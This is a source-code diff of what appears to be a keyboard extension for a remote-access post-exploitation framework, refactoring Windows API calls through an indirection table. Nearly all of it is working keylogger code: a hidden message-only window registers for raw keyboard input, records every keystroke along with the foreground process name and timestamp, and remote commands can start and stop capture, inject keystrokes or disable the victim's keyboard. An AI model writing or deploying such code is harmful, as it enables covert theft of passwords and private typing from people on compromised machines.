@@ -2,7 +2,6 @@
 #include "common_metapi.h"
 #include "keyboard.h"
 #include <tchar.h>
-#include <psapi.h>
 
 extern HMODULE hookLibrary;
 extern HINSTANCE hAppInstance;
@@ -10,7 +9,6 @@ extern HINSTANCE hAppInstance;
 LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
 INT ui_log_key(UINT vKey, USHORT mCode, USHORT Flags);
 INT ui_log_key_actwin(UINT vKey, USHORT mCode, USHORT Flags);
-INT ui_resolve_raw_api();
 
 /*
  * Enables or disables keyboard input
@@ -31,14 +29,14 @@ DWORD request_ui_enable_keyboard(Remote *remote, Packet *request)
 	// If the hook library is loaded successfully...
 	if (hookLibrary)
 	{
-		DWORD(*enableKeyboardInput)(BOOL enable) = (DWORD(*)(BOOL))GetProcAddress(
+		DWORD(*enableKeyboardInput)(BOOL enable) = (DWORD(*)(BOOL))met_api->win_api.kernel32.GetProcAddress(
 			hookLibrary, "enable_keyboard_input");
 
 		if (enableKeyboardInput)
 			result = enableKeyboardInput(enable);
 	}
 	else
-		result = GetLastError();
+		result = met_api->win_api.kernel32.GetLastError();
 
 	// Transmit the response
 	met_api->packet.transmit_response(result, remote, response);
@@ -47,13 +45,6 @@ DWORD request_ui_enable_keyboard(Remote *remote, Packet *request)
 }
 
 typedef enum { false = 0, true = 1 } bool;
-
-// required function pointers
-
-f_GetRawInputData fnGetRawInputData;
-f_RegisterRawInputDevices fnRegisterRawInputDevices;
-f_GetProcessImageFileNameW fnGetProcessImageFileNameW;
-f_QueryFullProcessImageNameW fnQueryFullProcessImageNameW;
 
 // this could be modified
 const char g_szClassName[] = "klwClass";
@@ -103,7 +94,7 @@ typedef struct {
 BOOL CALLBACK ecw_callback(HWND hWnd, LPARAM lp) {
 	WNDINFO* info = (WNDINFO*)lp;
 	DWORD pid = 0;
-	GetWindowThreadProcessId(hWnd, &pid);
+	met_api->win_api.user32.GetWindowThreadProcessId(hWnd, &pid);
 	if (pid != info->ppid) info->cpid = pid;
 	return TRUE;
 }
@@ -116,17 +107,6 @@ int WINAPI ui_keyscan_proc()
 {
 	WNDCLASSEX klwc;
 	MSG msg;
-	int ret = 0;
-
-	if (fnGetRawInputData == NULL || fnRegisterRawInputDevices == NULL)
-	{
-		ret = ui_resolve_raw_api();
-		if (!ret)		 // api resolution failed
-		{
-			return 0;
-		}
-	}
-
 	// register window class
 	ZeroMemory(&klwc, sizeof(WNDCLASSEX));
 	klwc.cbSize = sizeof(WNDCLASSEX);
@@ -134,13 +114,13 @@ int WINAPI ui_keyscan_proc()
 	klwc.hInstance = hAppInstance;
 	klwc.lpszClassName = g_szClassName;
 
-	if (!RegisterClassEx(&klwc))
+	if (!met_api->win_api.user32.RegisterClassExA(&klwc))
 	{
 		return 0;
 	}
 
 	// create message-only window
-	ghwnd = CreateWindowEx(
+	ghwnd = met_api->win_api.user32.CreateWindowExA(
 		0,
 		g_szClassName,
 		NULL,
@@ -155,10 +135,10 @@ int WINAPI ui_keyscan_proc()
 	}
 
 	// message loop
-	while (GetMessage(&msg, NULL, 0, 0) > 0)
+	while (met_api->win_api.user32.GetMessageA(&msg, NULL, 0, 0) > 0)
 	{
-		TranslateMessage(&msg);
-		DispatchMessage(&msg);
+		met_api->win_api.user32.TranslateMessage(&msg);
+		met_api->win_api.user32.DispatchMessageA(&msg);
 	}
 
 	return (INT)msg.wParam;
@@ -179,20 +159,21 @@ LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM l
 		rid.dwFlags = RIDEV_INPUTSINK;
 		rid.hwndTarget = hwnd;
 
-		if (!fnRegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
+		if (!met_api->win_api.user32.RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
 		{
 			return -1;
 		}
 
 	case WM_INPUT:
 		// request size of the raw input buffer to dwSize
-		fnGetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
+		met_api->win_api.user32.GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
 			sizeof(RAWINPUTHEADER));
 
 		// allocate buffer for input data
-		buffer = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, dwSize);
+		buffer = (RAWINPUT*)met_api->win_api.kernel32.HeapAlloc(
+			met_api->win_api.kernel32.GetProcessHeap(), 0, dwSize);
 
-		if (fnGetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
+		if (met_api->win_api.user32.GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
 			sizeof(RAWINPUTHEADER)))
 		{
 			// if this is keyboard message and WM_KEYDOWN, log the key
@@ -200,12 +181,13 @@ LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM l
 				&& buffer->data.keyboard.Message == WM_KEYDOWN)
 			{
 				if (gfn_log_key(buffer->data.keyboard.VKey, buffer->data.keyboard.MakeCode, buffer->data.keyboard.Flags) == -1)
-					DestroyWindow(hwnd);
+					met_api->win_api.user32.DestroyWindow(hwnd);
 			}
 		}
 
 		// free the buffer
-		HeapFree(GetProcessHeap(), 0, buffer);
+		met_api->win_api.kernel32.HeapFree(
+			met_api->win_api.kernel32.GetProcessHeap(), 0, buffer);
 		break;
 
 	case WM_CLOSE:
@@ -217,14 +199,14 @@ LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM l
 		g_keyscan_buf = NULL;
 
 		// destroy window and unregister window class
-		DestroyWindow(hwnd);
-		UnregisterClass(g_szClassName, hAppInstance);
+		met_api->win_api.user32.DestroyWindow(hwnd);
+		met_api->win_api.user32.UnregisterClassA(g_szClassName, hAppInstance);
 		break;
 
 	case WM_QUIT:
 		return 0;
 	default:
-		return DefWindowProc(hwnd, msg, wParam, lParam);
+		return met_api->win_api.user32.DefWindowProcA(hwnd, msg, wParam, lParam);
 	}
 	return 0;
 }
@@ -248,7 +230,7 @@ DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
 	}
 	else {
 		// Make sure we have access to the input desktop
-		if (GetAsyncKeyState(0x0a) == 0) {
+		if (met_api->win_api.user32.GetAsyncKeyState(0x0a) == 0) {
 			// initialize g_keyscan_buf
 			if (g_keyscan_buf) {
 				free(g_keyscan_buf);
@@ -257,7 +239,7 @@ DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
 
 			g_keyscan_buf = calloc(KEYBUFSIZE, sizeof(WCHAR));
 
-			tKeyScan = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ui_keyscan_proc, NULL, 0, NULL);
+			tKeyScan = met_api->win_api.kernel32.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ui_keyscan_proc, NULL, 0, NULL);
 			KEYSCAN_RUNNING = true;
 		}
 		else {
@@ -283,8 +265,8 @@ DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
 
 	if (tKeyScan) {
 		KEYSCAN_RUNNING = false;
-		SendMessageA(ghwnd, WM_CLOSE, 0, 0);
-		CloseHandle(tKeyScan);
+		met_api->win_api.user32.SendMessageA(ghwnd, WM_CLOSE, 0, 0);
+		met_api->win_api.kernel32.CloseHandle(tKeyScan);
 		tKeyScan = NULL;
 	}
 	else {
@@ -354,7 +336,7 @@ DWORD request_ui_send_keys(Remote *remote, Packet *request)
 		{
 			input[0].ki.wScan = *loopkeys;
 			input[1].ki.wScan = *loopkeys;
-			SendInput(2, input, sizeof(INPUT));
+			met_api->win_api.user32.SendInput(2, input, sizeof(INPUT));
 			loopkeys++;
 		}
 		free(keys);
@@ -374,11 +356,11 @@ void ui_send_key(WORD keycode, DWORD flags)
 	INPUT input[1] = {0};
 	input[0].type = INPUT_KEYBOARD;
 	input[0].ki.time = 0;
-	input[0].ki.wScan = MapVirtualKey(keycode, MAPVK_VK_TO_VSC);
+	input[0].ki.wScan = met_api->win_api.user32.MapVirtualKeyA(keycode, MAPVK_VK_TO_VSC);
 	input[0].ki.dwExtraInfo = 0;
 	input[0].ki.wVk = keycode;
 	input[0].ki.dwFlags = flags;
-	SendInput(1, input, sizeof(INPUT));
+	met_api->win_api.user32.SendInput(1, input, sizeof(INPUT));
 }
 
 /*
@@ -439,8 +421,8 @@ int ui_log_key_actwin(UINT vKey, USHORT mCode, USHORT Flags)
 	BYTE lpKeyboard[256];
 	WCHAR kb[16] = { 0 };
 
-	GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
-	GetKeyboardState(lpKeyboard);
+	met_api->win_api.user32.GetKeyState(VK_CAPITAL); met_api->win_api.user32.GetKeyState(VK_SCROLL); met_api->win_api.user32.GetKeyState(VK_NUMLOCK);
+	met_api->win_api.user32.GetKeyboardState(lpKeyboard);
 
 	// treat g_keyscan_buf as a circular array
 	// boundary could be adjusted
@@ -450,36 +432,40 @@ int ui_log_key_actwin(UINT vKey, USHORT mCode, USHORT Flags)
 	}
 
 	// get focused window pid
-	foreground_wnd = GetForegroundWindow();
-	GetWindowThreadProcessId(foreground_wnd, &info.ppid);
+	foreground_wnd = met_api->win_api.user32.GetForegroundWindow();
+	met_api->win_api.user32.GetWindowThreadProcessId(foreground_wnd, &info.ppid);
 	info.cpid = info.ppid;
 
 	// resolve full image name
-	EnumChildWindows(foreground_wnd, ecw_callback, (LPARAM)&info);
-	active_proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, info.cpid);
+	met_api->win_api.user32.EnumChildWindows(foreground_wnd, ecw_callback, (LPARAM)&info);
+	active_proc = met_api->win_api.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, info.cpid);
 
 	if (active_proc) {
-		// if null, we're on pre-vista or something is terribly wrong
-		(fnQueryFullProcessImageNameW) ? fnQueryFullProcessImageNameW(active_proc, 0, (LPTSTR)g_active_image, &mpsz) : fnGetProcessImageFileNameW(active_proc, (LPTSTR)g_active_image, mpsz);
+		// QueryFullProcessImageNameW is unavailable before Vista.
+		if (!met_api->win_api.kernel32.QueryFullProcessImageNameW(active_proc, 0, g_active_image, &mpsz))
+		{
+			mpsz = MAX_PATH;
+			met_api->win_api.psapi.GetProcessImageFileNameW(active_proc, g_active_image, mpsz);
+		}
 
 		// new window in focus, notate it
 		if (wcscmp(g_active_image, g_prev_active_image) != 0)
 		{
-			GetSystemTime(&st);
-			GetDateFormatW(LOCALE_SYSTEM_DEFAULT, DATE_LONGDATE, &st, NULL, date_s, sizeof(date_s));
-			GetTimeFormatW(LOCALE_USER_DEFAULT, TIME_FORCE24HOURFORMAT, &st, NULL, time_s, sizeof(time_s));
+			met_api->win_api.kernel32.GetSystemTime(&st);
+			met_api->win_api.kernel32.GetDateFormatW(LOCALE_SYSTEM_DEFAULT, DATE_LONGDATE, &st, NULL, date_s, sizeof(date_s));
+			met_api->win_api.kernel32.GetTimeFormatW(LOCALE_USER_DEFAULT, TIME_FORCE24HOURFORMAT, &st, NULL, time_s, sizeof(time_s));
 			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"\n**\n-[ %s | PID: %d\n-[ @ %s %s UTC\n**\n", g_active_image, info.cpid, date_s, time_s);
 			RtlZeroMemory(g_prev_active_image, MAX_PATH);
 			_snwprintf(g_prev_active_image, MAX_PATH, L"%s", g_active_image);
 		}
-		CloseHandle(active_proc);
+		met_api->win_api.kernel32.CloseHandle(active_proc);
 	}
 
 	// needed for some wonky cases
 	const bool isE0 = ((Flags & RI_KEY_E0) != 0);
 	const bool isE1 = ((Flags & RI_KEY_E1) != 0);
 	UINT key = (mCode << 16) | (isE0 << 24);
-	BOOL ctrl_is_down = (1 << 15) & (GetAsyncKeyState(VK_CONTROL));
+	BOOL ctrl_is_down = (1 << 15) & (met_api->win_api.user32.GetAsyncKeyState(VK_CONTROL));
 
 	switch (vKey)
 	{
@@ -502,21 +488,21 @@ int ui_log_key_actwin(UINT vKey, USHORT mCode, USHORT Flags)
 		g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<Tab>");
 		break;
 	case VK_NUMLOCK: // pause/break and numlock both send the same message
-		key = (MapVirtualKey(vKey, MAPVK_VK_TO_VSC) | 0x100);
-		if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
+		key = (met_api->win_api.user32.MapVirtualKeyA(vKey, MAPVK_VK_TO_VSC) | 0x100);
+		if (met_api->win_api.user32.GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
 			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
 		break;
 	default:
 		if (ctrl_is_down)
 		{
-			if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
+			if (met_api->win_api.user32.GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
 				g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<^%ls>", gknt_buf);
 		}
-		else if (ToUnicodeEx(vKey, mCode, lpKeyboard, kb, 16, 0, NULL) == 1)
+		else if (met_api->win_api.user32.ToUnicodeEx(vKey, mCode, lpKeyboard, kb, 16, 0, NULL) == 1)
 		{
 			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"%ls", kb);
 		}
-		else if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
+		else if (met_api->win_api.user32.GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
 		{
 			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
 		}
@@ -539,8 +525,8 @@ int ui_log_key(UINT vKey, USHORT mCode, USHORT Flags)
 	BYTE lpKeyboard[256];
 	WCHAR kb[16] = { 0 };
 
-	GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
-	GetKeyboardState(lpKeyboard);
+	met_api->win_api.user32.GetKeyState(VK_CAPITAL); met_api->win_api.user32.GetKeyState(VK_SCROLL); met_api->win_api.user32.GetKeyState(VK_NUMLOCK);
+	met_api->win_api.user32.GetKeyboardState(lpKeyboard);
 
 	// treat g_keyscan_buf as a circular array
 	// boundary could be adjusted
@@ -553,7 +539,7 @@ int ui_log_key(UINT vKey, USHORT mCode, USHORT Flags)
 	const bool isE0 = ((Flags & RI_KEY_E0) != 0);
 	const bool isE1 = ((Flags & RI_KEY_E1) != 0);
 	UINT key = (mCode << 16) | (isE0 << 24);
-	BOOL ctrl_is_down = (1 << 15) & (GetAsyncKeyState(VK_CONTROL));
+	BOOL ctrl_is_down = (1 << 15) & (met_api->win_api.user32.GetAsyncKeyState(VK_CONTROL));
 
 	switch (vKey)
 	{
@@ -576,78 +562,24 @@ int ui_log_key(UINT vKey, USHORT mCode, USHORT Flags)
 		g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<Tab>");
 		break;
 	case VK_NUMLOCK: // pause/break and numlock both send the same message
-		key = (MapVirtualKey(vKey, MAPVK_VK_TO_VSC) | 0x100);
-		if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
+		key = (met_api->win_api.user32.MapVirtualKeyA(vKey, MAPVK_VK_TO_VSC) | 0x100);
+		if (met_api->win_api.user32.GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
 			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
 		break;
 	default:
 		if (ctrl_is_down)
 		{
-			if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
+			if (met_api->win_api.user32.GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
 				g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<^%ls>", gknt_buf);
 		}
-		else if (ToUnicodeEx(vKey, mCode, lpKeyboard, kb, 16, 0, NULL) == 1)
+		else if (met_api->win_api.user32.ToUnicodeEx(vKey, mCode, lpKeyboard, kb, 16, 0, NULL) == 1)
 		{
 			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"%ls", kb);
 		}
-		else if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
+		else if (met_api->win_api.user32.GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
 		{
 			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
 		}
 	}
 	return 0;
-}
-
-/*
- * resolve required functions
- */
-
-int ui_resolve_raw_api()
-{
-	HANDLE user32 = LoadLibrary("user32.dll");
-	HANDLE psapi = LoadLibrary("psapi.dll");
-	HANDLE kernel32 = LoadLibrary("kernel32.dll");
-
-	if (!user32 || !kernel32 || !psapi)
-	{
-		return 0;
-	}
-
-	fnQueryFullProcessImageNameW = (f_QueryFullProcessImageNameW)GetProcAddress(kernel32, "QueryFullProcessImageNameW");
-	if (!fnQueryFullProcessImageNameW)
-	{
-		// Pre Vista -> GetProcessImageFileName
-		HANDLE psapi = LoadLibrary("Psapi.dll");
-		if (!psapi)
-		{
-			return 0;
-		}
-		fnGetProcessImageFileNameW = (f_GetProcessImageFileNameW)GetProcAddress(psapi, "GetProcessImageFileNameW");
-		if (!fnGetProcessImageFileNameW)
-		{
-			return 0;
-		}
-	}
-
-	fnGetProcessImageFileNameW = (f_GetProcessImageFileNameW)GetProcAddress(psapi, "GetProcessImageFileNameW");
-	if (!fnGetProcessImageFileNameW)
-	{
-		return 0;
-	}
-
-	fnGetRawInputData = (f_GetRawInputData)GetProcAddress(user32, "GetRawInputData");
-	if (fnGetRawInputData == NULL)
-	{
-		FreeLibrary(user32);
-		return 0;
-	}
-
-	fnRegisterRawInputDevices = (f_RegisterRawInputDevices)GetProcAddress(user32, "RegisterRawInputDevices");
-	if (fnRegisterRawInputDevices == NULL)
-	{
-		FreeLibrary(user32);
-		return 0;
-	}
-
-	return 1;
 }
